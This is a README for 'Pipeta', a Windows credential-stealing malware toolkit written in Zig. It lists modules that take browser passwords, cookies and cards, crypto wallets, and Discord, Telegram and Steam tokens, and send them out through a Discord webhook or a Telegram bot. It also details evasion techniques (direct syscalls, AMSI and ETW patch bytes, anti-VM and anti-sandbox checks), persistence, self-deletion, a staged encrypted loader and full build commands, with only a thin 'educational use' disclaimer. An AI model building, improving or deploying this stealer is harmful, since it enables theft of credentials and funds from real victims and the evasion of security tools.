<div align="center">

# Pipeta

**Windows credential extraction toolkit**

*gotinha por gotinha*

[![Zig](https://img.shields.io/badge/Zig-0.16.0-F7A41D?style=flat&logo=zig)](https://ziglang.org)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat&logo=windows)]()

</div>

---

> ! Educational and authorized security research only. You are solely responsible for your actions.

## What it does

| Module | Description |
|--------|-------------|
| **Browser extraction** | Chrome, Edge, Brave, Opera, Firefox — passwords, cookies, credit cards, history |
| **Crypto wallets** | 20+ desktop wallets + 30+ browser extensions (Metamask, Phantom, Trust, etc) |
| **Token capture** | Discord v10 encrypted tokens, Telegram tdata sessions, Steam ssfn |
| **System recon** | Hardware, network, public IP, screenshot, clipboard, WiFi passwords |
| **File grabber** | Smart file collection (.key, .pem, .wallet, .rdp, .kdbx, documents, etc) |
| **Evasion** | Direct syscalls, Hell's Gate + Halo's Gate SSN resolution, API hashing, anti-VM/anti-debug/anti-DNS/anti-timing, AMSI/ETW patch via NtProtectVirtualMemory |
| **Exfiltration** | Discord webhook + Telegram bot via dynamic WinHTTP (clean IAT) |
| **Persistence** | ADVAPI32 dynamic registry (RegOpenKeyExA/RegSetValueExA) |
| **Self-delete** | MoveFileExW with MOVEFILE_DELAY_UNTIL_REBOOT (no cmd.exe, no .bat) |
| **Staged loader** | Encrypted payload via @embedFile, dynamic CreateProcessW, anti-uptime check |

## Quick start

```bash
# Cross-compile from Linux (requires Zig 0.16.0+)
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseSmall
```

Output: `zig-out/bin/pipetastealer.exe` (~1.2 MB with SQLite)

### ReleaseSmall vs ReleaseFast

| Flag | Size | Speed | Use case |
|------|------|-------|----------|
| `ReleaseSmall` | ~1.2 MB | Good | Production |
| `ReleaseFast` | ~1.5 MB | Best | Testing |

## Staged loader build

The staged loader splits execution into two binaries: a small loader that decrypts and runs the real payload in memory. This reduces static detection since the payload is encrypted with a target-specific key.

### How it works

1. **Payload** (`pipetastealer.exe`) — the main binary, built normally
2. **Encrypt** — XOR-encrypt the payload with SHA256(salt key)
3. **Loader** (`loader.exe`) — tiny stub that embeds `payload.enc`, runs anti-analysis, patches AMSI/ETW, decrypts and executes the payload from temp via dynamic CreateProcessW

### Build steps

```bash
# 1. Build the payload normally
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseSmall

# 2. Encrypt the payload (uses built-in key)
zig run ./src/cmd/encrypt_payload.zig zig-out/bin/pipetastealer.exe src/loader/payload.enc

# 3. Build the loader (it embeds payload.enc via @embedFile)
cd src/loader
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseSmall
cd ../..

# 4. Clean the payload.enc from loader dir (it's already embedded)
rm src/loader/payload.enc
```

## Stealth architecture

| Technique | Implementation |
|-----------|---------------|
| **Direct syscalls** | Inline asm `syscall` instructions — no ntdll hooks |
| **SSN resolution** | Hell's Gate + Halo's Gate — works even with hooked ntdll |
| **PEB walking** | Manual DLL base resolution via `gs:0x60` — no GetModuleHandle/GetProcAddress in IAT |
| **AMSI bypass** | `mov eax, 0x80070057; ret` via NtProtectVirtualMemory syscall |
| **ETW bypass** | `ret; nop...` patch via NtProtectVirtualMemory syscall |
| **Clean IAT** | No WinHTTP, no CreateProcess, no Reg* — all loaded dynamically at runtime |
| **Anti-VM** | Uptime check (<30min), CPU cores, MAC prefix detection |
| **Anti-debug** | NtQueryInformationProcess, IsDebuggerPresent via PEB |
| **Anti-sandbox** | Human interaction check (mouse movement + keypress), DNS validation |
| **NtDelayExecution** | All sleeps via direct syscall — no time.Sleep / SleepEx |
| **String encryption** | XOR + base64 with 16-byte key, decoded at runtime |
| **Payload encryption** | SHA256-derived key XOR, base64 encoded, @embedFile |

## Configuration

Edit `src/ajuste.zig` before building:

```zig
pub const roubar_navegadores = true;
pub const roubar_crypto = true;
pub const roubar_discord = true;
pub const roubar_telegram = true;
pub const roubar_steam = true;
pub const tirar_captura = true;
pub const coletar_info_sistema = true;
pub const persistir = false;
pub const auto_destruir = false;
pub const anti_vm = true;
pub const anti_debug = true;
pub const pegador_arquivos = true;
```

Encrypted strings use `decAlloc`:

```zig
const value = try ajuste.decAlloc(allocator, "base64_xored_string");
```

## Encoding strings

Use the encoder to add new encrypted strings to `ajuste.zig`:

```bash
zig run ./src/cmd/encode.zig "sensitive string"
# outputs: base64-encoded XOR string
# use as: ajuste.decAlloc(allocator, "output_here")
```

## Project structure

```
pipeta/
├── build.zig               Zig build config (subsystem=Windows, sqlite3.c, crypt32)
├── deps/                    SQLite amalgamation (sqlite3.c/h)
├── src/
│   ├── main.zig             Entry point & orchestration
│   ├── ajuste.zig           Configuration & XOR+base64 string encryption
│   ├── capturar/            Token extraction (discord, telegram, steam)
│   ├── cofrinho/            Crypto wallet extraction
│   ├── direto/              Direct syscalls (inline asm), SSN resolution, Hell's Gate
│   │   ├── direto.zig       Syscall wrappers (NtProtectVirtualMemory, NtDelayExecution, etc)
│   │   ├── ntdll.zig        PEB walking, ntdll base resolution
│   │   └── ssn.zig          SSN extraction + Hell's Gate + Halo's Gate
│   ├── dpapi.zig            DPAPI (CryptUnprotectData) + AES-256-GCM decryption
│   ├── extrair.zig          Browser data extraction (Chromium + Firefox)
│   ├── fixar.zig            Persistence (dynamic ADVAPI32) + self-delete (MoveFileExW)
│   ├── furtivo.zig          Evasion & anti-analysis (AMSI/ETW patch, anti-VM/debug/sandbox)
│   ├── loader.zig           Staged loader (encrypted payload, dynamic CreateProcessW)
│   ├── saida.zig            Data exfiltration (dynamic WinHTTP, Discord/Telegram)
│   └── sondar.zig           System reconnaissance & file grabber
├── winres/                  Version info resource (Microsoft metadata)
├── LICENSE
└── README.md
```

## Supported targets

<details>
<summary><b> Browsers</b></summary>

- Google Chrome
- Microsoft Edge
- Brave
- Opera / Opera GX
- Vivaldi
- Yandex
- Chromium
- Firefox
- Waterfox

</details>

<details>
<summary><b>Crypto wallets (desktop)</b></summary>

- Exodus
- Electrum / Electrum-LTC
- Atomic Wallet
- Bitcoin Core
- Litecoin Core
- Dash Core
- Ethereum (geth keystore)
- Monero
- Zcash
- Wasabi Wallet
- Jaxx, Coinomi, Guarda, Armory, Bytecoin, Binance

</details>

<details>
<summary><b> Browser extensions</b></summary>

Metamask, Phantom, Trust Wallet, Coinbase Wallet, Binance Chain, Ronin, Keplr, Solflare, OKX, Rabby, Braavos, Trezor, Nami, Eternl, SubWallet, Hashpack, Petra, Sender, Finnie, Slope, Starcoin, Swash, XDeFi, Safepal, BitKeep, Coin98, and more...

</details>

<details>
<summary><b>Tokens & sessions</b></summary>

- Discord (encrypted v10/v11 tokens with AES-GCM decryption)
- Telegram Desktop (tdata session files)
- Steam (ssfn remember-me tokens + config/login VDF)

</details>

## License

MIT — see [LICENSE](LICENSE)

## Disclaimer

This project is provided for educational and authorized security research purposes only. The author assumes no liability and is not responsible for any misuse or damage. You are solely responsible for ensuring your use complies with applicable laws.
